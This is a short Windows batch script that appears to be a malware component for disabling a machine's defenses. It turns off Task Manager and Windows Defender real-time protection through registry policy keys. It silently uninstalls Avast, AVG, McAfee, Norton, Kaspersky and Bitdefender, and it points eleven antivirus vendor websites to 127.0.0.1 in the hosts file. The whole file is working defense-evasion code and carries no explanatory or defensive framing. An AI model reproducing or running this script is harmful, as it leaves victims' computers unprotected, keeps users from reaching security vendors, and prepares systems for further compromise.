@echo off
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

wmic product where "name like '%%Avast%%Free%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%AVG%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%McAfee%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%Norton%%Security%%'" call uninstall /nointeractive
wmic product where "name like '%%Kaspersky%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%Bitdefender%%'" call uninstall /nointeractive

set "hosts_file=%windir%\System32\drivers\etc\hosts"

echo 127.0.0.1     www.avg.com >> %hosts_file%
echo 127.0.0.1     www.avast.com >> %hosts_file%
echo 127.0.0.1     www.bitdefender.com >> %hosts_file%
echo 127.0.0.1     www.mcafee.com >> %hosts_file%
echo 127.0.0.1     www.norton.com >> %hosts_file%
echo 127.0.0.1     www.eset.com >> %hosts_file%
echo 127.0.0.1     www.kaspersky.com >> %hosts_file%
echo 127.0.0.1     www.sophos.com >> %hosts_file%
echo 127.0.0.1     www.trendmicro.com >> %hosts_file%
echo 127.0.0.1     www.webroot.com >> %hosts_file%
echo 127.0.0.1     www.pandasecurity.com >> %hosts_file%
